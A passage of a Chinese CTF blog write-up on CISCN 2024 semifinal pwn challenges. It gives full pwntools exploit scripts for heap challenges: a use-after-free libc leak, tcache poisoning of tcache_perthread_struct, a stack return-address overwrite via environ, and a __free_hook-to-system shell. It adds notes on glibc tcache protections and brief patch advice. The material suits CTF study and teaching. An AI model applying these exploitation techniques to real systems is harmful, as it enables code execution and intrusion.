+    pwnfile = <span class="string">&#x27;./heap&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    <span class="comment"># libc = ELF(libc_name)</span>
+
+    io = init(pwnfile, IPort, libc_name)
+
+    <span class="comment">#add_4_chunk</span>
+    addflag()
+    ru(<span class="string">b&#x27;:&#x27;</span>)
+    ori = <span class="built_in">int</span>(r(<span class="number">8</span>), <span class="number">10</span>)
+    addflag()
+    addflag()
+    addflag()
+    chkflag()
+
+    getflag(<span class="number">0x4e60f0</span>)
+    ru(<span class="string">b&#x27;::&#x27;</span>)
+    magic = <span class="built_in">int</span>(r(<span class="number">19</span>), <span class="number">10</span>)
+
+    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):
+        editflag(<span class="built_in">int</span>(ori + <span class="number">12</span>*i), <span class="built_in">int</span>(magic))
+        magic = (<span class="number">0x5851F42D4C957F2D</span> * magic + <span class="number">12345</span>) & <span class="number">0x7FFFFFFFFFFFFFFF</span>
+
+    chkflag()
+
+    <span class="built_in">print</span>(<span class="string">"ori = "</span> + <span class="built_in">str</span>(ori))
+    leak(<span class="string">"magic"</span>, magic)
+    <span class="comment"># debug(&#x27;b *0x00000000004020b2 \n \</span>
+    <span class="comment">#       tele 0x4E82F0 \n \</span>
+    <span class="comment">#       hex 0x4E60F0&#x27;)</span>
+    itr()</code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251818976.png" alt="image-20240625181804898"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次国赛就这样过了，经验还是太少了，没想到pwn1改栈权限就行了。。。再接再厉吧。</p>
+<p>awd类型的比赛以攻为主，防御为辅，毕竟都是刷ctf出来的，肯定是漏洞利用熟悉一点，再怎么样也会比瞎捣鼓patch好点。</p>
+<p>链接参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45906533/article/details/139937288">https://blog.csdn.net/weixin_45906533/article/details/139937288</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/705148718?utm_psn=1788963199141429250">2024全国大学生信息安全竞赛（ciscn）半决赛（华东北赛区）Pwn题解 - 知乎 (zhihu.com)</a></p>
+<h1 id="华南"><a href="#华南" class="headerlink" title="华南"></a>华南</h1><p>一道堆题</p>
+<h2 id="my-heap"><a href="#my-heap" class="headerlink" title="my_heap"></a>my_heap</h2><p>Ubuntu GLIBC 2.35-0ubuntu3.7</p>
+<p>add：输入1能申请任意大小chunk，更新buf指向申请的chunk；非1只能malloc(0x4f0)，不更新buf</p>
+<p>dele：uaf</p>
+<p>show：打印buf-&gt;data 7字节，并且进行异或加密</p>
+<p>edit：往buf里写8字节数据</p>
+<p>getbackdoor：拿到程序基地址以及一次0x20字节写</p>
+<blockquote>
+<p>tcache机制  libc-2.26引入   Ubuntu-17.04以后</p>
+<p>tcache_perthread_struct中存储着各个tcachebin结构体的counts以及bin表头，tcache_entry-&gt;next    </p>
+<p>2.26下tcache不会检查链表完整性，double free</p>
+<p>2.29增加了对size位的chk，需要进行size对齐    增加了链表遍历直接free两次失效，并且counts不能向下溢出</p>
+<p>2.34+增加了PROTECT_PTR(pos, ptr)宏定义来将  ptr_addr&gt;&gt;12与ptr进行异或加密</p>
+<p>tc free时会对e-&gt;key进行赋值，用于检测double free，将key破坏掉就能绕过double的chk</p>
+<p>2.34+ 删除了dl_rtld_lock_recursiveh和dl_rtld_unlock_recursive   没有了malloc_hook等</p>
+<p>getshell方法有：1.栈；2.vtable；3.tls_dtor_list挟持__exit_funcs链表（<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/243196#h2-2">exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)</a>）</p>
+</blockquote>
+<p>攻击思路：</p>
+<ol>
+<li>利用uaf泄露出libc_base和heap_base</li>
+<li>利用getbackdoor来拿程序基地址，以及改写tcachebin_key，实现tcachebin doublefree，但是由于我们每次只能控制buf指向的chunk，所以无法得到两个以上的相同大小的tc来进行tb attack。需要先控制了tcache_perthread_struct结构体中的counts数组，对bin数目进行控制。由于我们只能写8字节，所以挟持到tcache_perthread_struct+0x10后可控0x20~0x50(8&#x2F;2)。然后修改1&lt;counts&lt;7（目的是防止后面的chunk free时被放入到fb中）</li>
+<li>后面就是两次tcachebin attack：利用泄露出来的程序基地址来打buf，此时buf-&gt;buf，然后利用edit修改buf，此时将buf修改为了edit函数的返回地址，然后再利用edit函数修改返回地址为backdoor+8 或者 one_gadget</li>
+</ol>
+<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):
+    sla(<span class="string">b&#x27;magic heap has 4 choice : \nadd\ndelete\nshow\nedit\n&#x27;</span>,<span class="built_in">str</span>(num))
+<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx=<span class="number">1</span>, size=<span class="number">1</span></span>):
+    menu(<span class="number">1</span>)
+    sla(<span class="string">b&#x27;which one you choose?\n&#x27;</span>, <span class="built_in">str</span>(idx))
+    <span class="keyword">if</span> idx != <span class="number">5</span>:
+        sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))
+<span class="keyword">def</span> <span class="title function_">dele</span>():
+    menu(<span class="number">2</span>)
+<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content=<span class="string">b&#x27;aaaa&#x27;</span></span>):
+    menu(<span class="number">4</span>)
+    sa(<span class="string">b&#x27;edit data:&#x27;</span>, content)
+<span class="keyword">def</span> <span class="title function_">show</span>():
+    menu(<span class="number">3</span>)
+    ru(<span class="string">b&#x27;the data:&#x27;</span>)
+    enc = r(<span class="number">7</span>)
+    <span class="comment"># print(enc)</span>
+    <span class="comment"># for i in range(7):</span>
+    <span class="comment">#     enc[i] = enc[i] ^ (i + 153)</span>
+    <span class="comment"># print(enc)</span>
+    dec = [<span class="number">0</span>]*<span class="number">7</span>
+    j = <span class="number">0</span>
+    <span class="keyword">for</span> i <span class="keyword">in</span> enc:
+        dec[j] = i ^ (j+<span class="number">153</span>)
+        j += <span class="number">1</span>
+    <span class="keyword">return</span> uu64(<span class="built_in">bytes</span>(dec))
+        
+        
+<span class="keyword">def</span> <span class="title function_">getBackdoor</span>():
+    menu(<span class="number">5</span>)
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;1 1&#x27;</span>
+    pwnfile = <span class="string">&#x27;./my_heap&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.35-0ubuntu3.7_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    libc = ELF(libc_name)
+
+    io = init(pwnfile, IPort, libc_name)
+    add(<span class="number">1</span>, <span class="number">0x418</span>)
+    add(<span class="number">5</span>)
+    dele()
+    libc_base = show() - <span class="number">0x21ace0</span>
+    add(<span class="number">1</span>, <span class="number">0x88</span>)
+    dele()  <span class="comment">#tb -> 1</span>
+    heap_addr = show()
+    heap_base = heap_addr << <span class="number">12</span>
+    getBackdoor()
+    ru(<span class="string">b&#x27;0x&#x27;</span>)
+    ori = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)
+    buf = ori - <span class="number">0x12be</span> + <span class="number">0x04040</span>
+    ru(<span class="string">b&#x27;edit data:&#x27;</span>)
+    s(p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>))  <span class="comment">#key_clean</span>
+    dele()   <span class="comment">#tb ->tcache_perthread ->1</span>
+    edit(p64(heap_base >><span class="number">12</span> ^(heap_base + <span class="number">0x10</span>)))
+    add(<span class="number">1</span>, <span class="number">0x88</span>)
+    add(<span class="number">1</span>, <span class="number">0x88</span>)
+    dele()
+    edit(p64(<span class="number">0</span>))
+    
+    add(<span class="number">1</span>, <span class="number">0x38</span>)
+    dele()
+    add(<span class="number">1</span>, <span class="number">0x48</span>)
+    dele()
+    add(<span class="number">1</span>, <span class="number">0x288</span>)
+    dele()
+    edit(<span class="string">b&#x27;\x03\x03\x05\x00\x05\x00\x05\x00&#x27;</span>)  <span class="comment">#0x30->5  0x40->5  0x50->5</span>
+
+    add(<span class="number">1</span>, <span class="number">0x38</span>)
+    dele()
+    edit(p64((heap_base>><span class="number">12</span>)^(libc.sym[<span class="string">&#x27;environ&#x27;</span>] + libc_base)))
+    add(<span class="number">1</span>, <span class="number">0x38</span>)
+    add(<span class="number">1</span>, <span class="number">0x38</span>)
+    stack_addr = show()
+    ret_addr   = stack_addr - <span class="number">0x140</span>
+
+    add(<span class="number">1</span>, <span class="number">0x48</span>)
+    dele()
+    edit(p64((heap_base>><span class="number">12</span>) ^ (buf)))
+    add(<span class="number">1</span>, <span class="number">0x48</span>)
+    add(<span class="number">1</span>, <span class="number">0x48</span>)
+
+    edit(p64(ret_addr))
+    edit(p64(ori+<span class="number">8</span>))
+    
+    leak(<span class="string">"libc_base"</span>, libc_base)
+    leak(<span class="string">"heap_base"</span>, heap_base)
+    leak(<span class="string">"stack_addr"</span>, stack_addr)
+    leak(<span class="string">"ret_addr"</span>, ret_addr)
+    leak(<span class="string">"backdoor_addr"</span>, ori)
+    leak(<span class="string">"buf"</span>, buf)
+    <span class="comment"># leak("info", info)</span>
+    <span class="comment"># debug(&#x27;tele $rebase(0x4040) \n \</span>
+    <span class="comment">#       b *$rebase(0x0x148d)&#x27;)</span>
+
+    itr()</code></pre>
+
+
+
+<p>fix的话把uaf给patch掉，backdoor nop掉</p>
+<h1 id="华中"><a href="#华中" class="headerlink" title="华中"></a>华中</h1><h2 id="pwn1-note"><a href="#pwn1-note" class="headerlink" title="pwn1-note"></a>pwn1-note</h2><p>2.31-0ubuntu9.9</p>
+<p>add：size小于0xFFF</p>
+<p>dele：uaf</p>
+<p>edit、show正常</p>
+<p>利用largechunk泄露libc，然后利用uaf改tcache链表为__free_hook</p>
+<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):
+    sla(<span class="string">b&#x27;5. exit\n&#x27;</span>,<span class="built_in">str</span>(num))
+<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):
+    menu(<span class="number">1</span>)
+    sla(<span class="string">b&#x27;The size of your content: \n&#x27;</span>,<span class="built_in">str</span>(size))
+    sla(<span class="string">b&#x27;content: \n&#x27;</span>, content)
+<span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):
+    menu(<span class="number">3</span>)
+    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))
+<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):
+    menu(<span class="number">2</span>)
+    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))
+    sla(<span class="string">b&#x27;The size of your content: \n&#x27;</span>, <span class="built_in">str</span>(size))
+    sa(<span class="string">b&#x27;Content: \n&#x27;</span>, content)
+<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):
+    menu(<span class="number">4</span>)
+    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28278&#x27;</span>
+    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    libc = ELF(libc_name)
+
+    io = init(pwnfile, IPort, libc_name)
+    add(<span class="number">0x418</span>)  <span class="comment">#0</span>
+    add(<span class="number">0x18</span>)   <span class="comment">#1</span>
+    dele(<span class="number">0</span>)
+    show(<span class="number">0</span>)
+    libc_base = uu64(r64()) - <span class="number">0x1ecbe0</span>
+    add(<span class="number">0x28</span>)  <span class="comment">#2</span>
+    add(<span class="number">0x28</span>)  <span class="comment">#3</span>
+    dele(<span class="number">3</span>)
+    dele(<span class="number">2</span>)    <span class="comment">#0x30: 2->3</span>
+    edit(<span class="number">2</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))
+    add(<span class="number">0x28</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)  <span class="comment">#4</span>
+    add(<span class="number">0x28</span>)  <span class="comment">#5</span>
+    edit(<span class="number">5</span>, <span class="number">0x8</span>, p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))
+    dele(<span class="number">4</span>)
+
+    leak(<span class="string">"libc_base"</span>, libc_base)
+    <span class="comment"># debug(&#x27;tele $rebase(0x04060) \n \</span>
+    <span class="comment">#       tele $rebase(0x06060)&#x27;)</span>
+    itr()
+</code></pre>
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ciscn/" rel="tag"># ciscn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/06/11/IO-FILE%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" rel="prev" title="_IO_FILE基础利用">
+                  <i class="fa fa-angle-left"></i> _IO_FILE基础利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/" rel="next" title="Iot-vulhub复现">
+                  Iot-vulhub复现 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">kkkk</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">87k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">1:19</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
